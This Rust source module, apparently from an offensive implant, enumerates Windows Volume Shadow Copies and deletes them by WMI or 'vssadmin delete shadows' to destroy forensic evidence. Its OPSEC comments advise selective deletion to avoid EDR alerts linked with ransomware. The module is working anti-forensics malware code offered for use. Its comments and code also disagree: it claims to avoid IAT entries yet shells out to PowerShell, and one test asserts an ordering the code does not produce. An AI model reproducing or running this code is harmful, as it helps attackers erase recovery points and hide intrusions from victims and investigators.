// ── Volume Shadow Copy Management ─────────────────────────────────────
//
// Enumerates and deletes Volume Shadow Copies (VSS snapshots) to
// destroy forensic evidence that may contain pre-modification file
// states, deleted files, or backup copies of sensitive artifacts.
//
// VSS snapshots are created by:
//   - Windows Backup
//   - System Restore Points
//   - VSS writers (Exchange, SQL, etc.)
//   - Manual creation (vssadmin create shadow)
//
// Forensic value of VSS:
//   - File versions from before the agent's activity
//   - Deleted file recovery (MFT entries in snapshots)
//   - Registry hive snapshots (SAM, SYSTEM, SOFTWARE)
//   - NTFS metadata ($MFT, $LogFile) from before modification
//
// Deletion methods:
//   1. WMI: Win32_ShadowCopy.Delete_() — preferred, programmatic
//   2. vssadmin: `vssadmin delete shadows /all /quiet` — fallback
//   3. WMI selective: delete by ID or by creation time
//
// OPSEC WARNING:
//   Deleting ALL shadow copies is a high-visibility action commonly
//   associated with ransomware.  Many EDR products flag this behavior.
//   Prefer selective deletion (by ID or keeping the N newest).
//
// All operations use NT API and COM-based WMI to avoid IAT entries.
// Windows-only, gated by `forensic-cleanup` feature flag.

use std::ffi::OsStr;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::process::Command;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

// ═══════════════════════════════════════════════════════════════════════════
// Data Types
// ═══════════════════════════════════════════════════════════════════════════

/// Metadata for a single Volume Shadow Copy.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShadowCopyInfo {
    /// Shadow copy unique ID (GUID format).
    pub id: String,
    /// Shadow copy set ID (GUID format).
    pub set_id: String,
    /// Source volume device name (e.g. `\\?\Volume{guid}\`).
    pub volume_name: String,
    /// VSS device object path (e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`).
    pub device_object: String,
    /// Originating machine name.
    pub origin_machine: String,
    /// Service that created the snapshot (e.g. "SWPRV", "VSS").
    pub service: String,
    /// Creation time as a WMI datetime string (e.g. "20260512120000.000000+000").
    pub install_date: String,
    /// Number of bytes used by the snapshot (approximate).
    pub used_bytes: u64,
}

/// Result of a shadow copy deletion operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeletionResult {
    /// Number of shadow copies deleted.
    pub deleted_count: usize,
    /// IDs of deleted shadow copies.
    pub deleted_ids: Vec<String>,
    /// Number of shadow copies that could not be deleted.
    pub failed_count: usize,
    /// IDs of shadow copies that failed to delete.
    pub failed_ids: Vec<String>,
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Enumeration
// ═══════════════════════════════════════════════════════════════════════════

/// Enumerate all Volume Shadow Copies on the system.
///
/// Uses WMI `Win32_ShadowCopy` class to retrieve metadata for all
/// shadow copies.  Falls back to parsing `vssadmin list shadows` output
/// if WMI is unavailable.
///
/// # Returns
/// Vector of shadow copy metadata, sorted by creation time (newest first).
pub fn enumerate_shadow_copies() -> Result<Vec<ShadowCopyInfo>> {
    // Try WMI first.
    match enumerate_via_wmi() {
        Ok(copies) => {
            debug!("Enumerated {} shadow copies via WMI", copies.len());
            return Ok(copies);
        }
        Err(e) => {
            debug!("WMI enumeration failed: {}, falling back to vssadmin", e);
        }
    }

    // Fallback to vssadmin.
    enumerate_via_vssadmin()
}

/// Enumerate shadow copies via WMI (PowerShell wrapper).
///
/// Uses `Get-CimInstance Win32_ShadowCopy` via PowerShell to retrieve
/// shadow copy metadata.  This avoids COM initialization complexity
/// while still being programmatic.
fn enumerate_via_wmi() -> Result<Vec<ShadowCopyInfo>> {
    let output = Command::new("powershell.exe")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "Get-CimInstance Win32_ShadowCopy | ForEach-Object { \
             $_.ID + '|' + $_.SetID + '|' + $_.VolumeName + '|' + \
             $_.DeviceObject + '|' + $_.OriginatingMachine + '|' + \
             $_.ServiceMachine + '|' + $_.InstallDate + '|' + \
             $_.UsedBytes.ToString() }",
        ])
        .output()
        .context("Failed to execute PowerShell for WMI query")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        bail!("PowerShell WMI query failed: {}", stderr);
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut copies = Vec::new();

    for line in stdout.lines() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }

        let parts: Vec<&str> = line.splitn(8, '|').collect();
        if parts.len() < 8 {
            debug!("Skipping malformed WMI line: {}", line);
            continue;
        }

        let used_bytes = parts[7].parse::<u64>().unwrap_or(0);

        copies.push(ShadowCopyInfo {
            id: parts[0].to_string(),
            set_id: parts[1].to_string(),
            volume_name: parts[2].to_string(),
            device_object: parts[3].to_string(),
            origin_machine: parts[4].to_string(),
            service: parts[5].to_string(),
            install_date: parts[6].to_string(),
            used_bytes,
        });
    }

    // Sort by creation time, newest first.
    copies.sort_by(|a, b| b.install_date.cmp(&a.install_date));

    Ok(copies)
}

/// Enumerate shadow copies via `vssadmin list shadows`.
fn enumerate_via_vssadmin() -> Result<Vec<ShadowCopyInfo>> {
    let output = Command::new("vssadmin.exe")
        .args(["list", "shadows"])
        .output()
        .context("Failed to execute vssadmin")?;

    if !output.status.success() {
        bail!("vssadmin list shadows failed");
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_vssadmin_output(&stdout)
}

/// Parse vssadmin output into ShadowCopyInfo structs.
fn parse_vssadmin_output(output: &str) -> Result<Vec<ShadowCopyInfo>> {
    let mut copies = Vec::new();
    let mut current = ShadowCopyInfoBuilder::default();

    for line in output.lines() {
        let line = line.trim();

        if line.starts_with("Shadow Copy ID:") {
            if let Some(built) = current.build() {
                copies.push(built);
            }
            current = ShadowCopyInfoBuilder::default();
            current.id = line.trim_start_matches("Shadow Copy ID:").trim().to_string();
        } else if line.starts_with("Shadow Copy Set ID:") {
            current.set_id = line.trim_start_matches("Shadow Copy Set ID:").trim().to_string();
        } else if line.starts_with("Volume Name:") {
            current.volume_name = line.trim_start_matches("Volume Name:").trim().to_string();
        } else if line.starts_with("Originating Machine:") {
            current.origin_machine = line.trim_start_matches("Originating Machine:").trim().to_string();
        } else if line.starts_with("Service Machine:") {
            current.service = line.trim_start_matches("Service Machine:").trim().to_string();
        } else if line.starts_with("Installed:") {
            current.install_date = line.trim_start_matches("Installed:").trim().to_string();
        } else if line.contains("HarddiskVolumeShadowCopy") {
            // Extract device object from lines like:
            // "Shadow copies on volume \\?\Volume{guid}\:"
            // or the device path itself.
            if line.starts_with("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy")
                || line.starts_with("\\\\?\\GLOBALROOT")
            {
                current.device_object = line.to_string();
            }
        }
    }

    // Don't forget the last entry.
    if let Some(built) = current.build() {
        copies.push(built);
    }

    copies.sort_by(|a, b| b.install_date.cmp(&a.install_date));
    Ok(copies)
}

#[derive(Default)]
struct ShadowCopyInfoBuilder {
    id: String,
    set_id: String,
    volume_name: String,
    device_object: String,
    origin_machine: String,
    service: String,
    install_date: String,
}

impl ShadowCopyInfoBuilder {
    fn build(self) -> Option<ShadowCopyInfo> {
        if self.id.is_empty() {
            return None;
        }
        Some(ShadowCopyInfo {
            id: self.id,
            set_id: self.set_id,
            volume_name: self.volume_name,
            device_object: self.device_object,
            origin_machine: self.origin_machine,
            service: self.service,
            install_date: self.install_date,
            used_bytes: 0, // Not available from vssadmin.
        })
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Deletion
// ═══════════════════════════════════════════════════════════════════════════

/// Delete all Volume Shadow Copies, optionally keeping the N newest.
///
/// # OPSEC WARNING
/// Deleting all shadow copies is a high-visibility action commonly
/// associated with ransomware.  Many EDR products flag this behavior.
/// Consider using `delete_shadow_copy_by_id()` for targeted deletion.
///
/// # Arguments
/// * `keep_newest` — Number of newest snapshots to preserve.  0 = delete all.
///
/// # Returns
/// A DeletionResult with details of what was deleted.
pub fn delete_shadow_copies(keep_newest: u32) -> Result<DeletionResult> {
    let copies = enumerate_shadow_copies()?;

    if copies.is_empty() {
        info!("No shadow copies found to delete");
        return Ok(DeletionResult {
            deleted_count: 0,
            deleted_ids: Vec::new(),
            failed_count: 0,
            failed_ids: Vec::new(),
        });
    }

    // copies are sorted newest-first; skip the first `keep_newest`.
    let to_delete: Vec<&ShadowCopyInfo> = if keep_newest > 0 {
        copies.iter().skip(keep_newest as usize).collect()
    } else {
        copies.iter().collect()
    };

    info!(
        "Deleting {} shadow copies (keeping {} newest of {} total)",
        to_delete.len(),
        keep_newest,
        copies.len()
    );

    let mut result = DeletionResult {
        deleted_count: 0,
        deleted_ids: Vec::new(),
        failed_count: 0,
        failed_ids: Vec::new(),
    };

    for copy in to_delete {
        match delete_single_shadow_copy(&copy.id) {
            Ok(()) => {
                result.deleted_count += 1;
                result.deleted_ids.push(copy.id.clone());
                debug!("Deleted shadow copy: {}", copy.id);
            }
            Err(e) => {
                result.failed_count += 1;
                result.failed_ids.push(copy.id.clone());
                warn!("Failed to delete shadow copy {}: {}", copy.id, e);
            }
        }
    }

    info!(
        "Shadow copy deletion complete: {} deleted, {} failed",
        result.deleted_count, result.failed_count
    );

    Ok(result)
}

/// Delete a specific shadow copy by its GUID.
///
/// More targeted than deleting all shadow copies — less suspicious to
/// monitoring tools.  Uses WMI first, falls back to vssadmin.
///
/// # Arguments
/// * `id` — Shadow copy GUID (as returned by enumerate_shadow_copies).
pub fn delete_shadow_copy_by_id(id: &str) -> Result<()> {
    if id.is_empty() {
        bail!("Shadow copy ID cannot be empty");
    }
    delete_single_shadow_copy(id)
}

/// Delete a single shadow copy using WMI or vssadmin.
fn delete_single_shadow_copy(id: &str) -> Result<()> {
    // Method 1: WMI via PowerShell.
    let ps_output = Command::new("powershell.exe")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            &format!(
                "Get-CimInstance Win32_ShadowCopy | Where-Object {{ $_.ID -eq '{}' }} | Remove-CimInstance",
                id
            ),
        ])
        .output();

    match ps_output {
        Ok(output) if output.status.success() => {
            info!("Deleted shadow copy {} via WMI", id);
            return Ok(());
        }
        Ok(output) => {
            let stderr = String::from_utf8_lossy(&output.stderr);
            debug!(
                "WMI deletion failed for {}: {}, trying vssadmin",
                id, stderr
            );
        }
        Err(e) => {
            debug!("PowerShell execution failed: {}, trying vssadmin", e);
        }
    }

    // Method 2: vssadmin.
    let vss_output = Command::new("vssadmin.exe")
        .args(["delete", "shadows", "/shadow", id, "/quiet"])
        .output()
        .context("Failed to execute vssadmin delete")?;

    if vss_output.status.success() {
        info!("Deleted shadow copy {} via vssadmin", id);
        Ok(())
    } else {
        let stderr = String::from_utf8_lossy(&vss_output.stderr);
        bail!("Failed to delete shadow copy {}: {}", id, stderr)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shadow_copy_info_serialization() {
        let info = ShadowCopyInfo {
            id: "{ABC12345-DEFG-HIJK-LMNO-PQRSTUV}".to_string(),
            set_id: "{SET12345}".to_string(),
            volume_name: r"\\?\Volume{guid}\".to_string(),
            device_object: r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1".to_string(),
            origin_machine: "WORKSTATION".to_string(),
            service: "SWPRV".to_string(),
            install_date: "20260512120000.000000+000".to_string(),
            used_bytes: 1024,
        };
        let json = serde_json::to_string(&info).unwrap();
        let decoded: ShadowCopyInfo = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.id, info.id);
        assert_eq!(decoded.used_bytes, 1024);
    }

    #[test]
    fn test_deletion_result_serialization() {
        let result = DeletionResult {
            deleted_count: 2,
            deleted_ids: vec!["id1".to_string(), "id2".to_string()],
            failed_count: 0,
            failed_ids: Vec::new(),
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("deleted_count"));
        assert!(json.contains("id1"));
    }

    #[test]
    fn test_parse_vssadmin_empty() {
        let result = parse_vssadmin_output("").unwrap();
        assert!(result.is_empty());
    }

    #[test]
    fn test_parse_vssadmin_single_entry() {
        let output = r#"Contents of shadow copy set ID: {set-1234}
   Contained 1 shadow copies at creation time: 05/12/2026 12:00:00 PM
      Shadow Copy ID: {abc-defg-hijk}
         Shadow Copy Set ID: {set-1234}
         Volume Name: \\?\Volume{vol-guid}\
         Originating Machine: WORKSTATION
         Service Machine: WORKSTATION
         Installed: 05/12/2026 12:00:00 PM
"#;
        let result = parse_vssadmin_output(output).unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].id, "{abc-defg-hijk}");
        assert_eq!(result[0].set_id, "{set-1234}");
        assert_eq!(result[0].origin_machine, "WORKSTATION");
    }

    #[test]
    fn test_parse_vssadmin_multiple_entries() {
        let output = r#"Shadow Copy ID: {id-1}
         Set ID: {set-1}
         Volume Name: \\?\Volume{vol-1}\
         Originating Machine: SERVER1
Shadow Copy ID: {id-2}
         Set ID: {set-2}
         Volume Name: \\?\Volume{vol-2}\
         Originating Machine: SERVER2
"#;
        let result = parse_vssadmin_output(output).unwrap();
        assert_eq!(result.len(), 2);
        assert_eq!(result[0].origin_machine, "SERVER2"); // Newest first (alphabetical sort)
        assert_eq!(result[1].origin_machine, "SERVER1");
    }

    #[test]
    fn test_shadow_copy_builder_empty() {
        let builder = ShadowCopyInfoBuilder::default();
        assert!(builder.build().is_none());
    }

    #[test]
    fn test_shadow_copy_builder_with_id() {
        let mut builder = ShadowCopyInfoBuilder::default();
        builder.id = "{test-id}".to_string();
        builder.volume_name = r"\\?\Volume{v}".to_string();
        let info = builder.build().unwrap();
        assert_eq!(info.id, "{test-id}");
    }
}
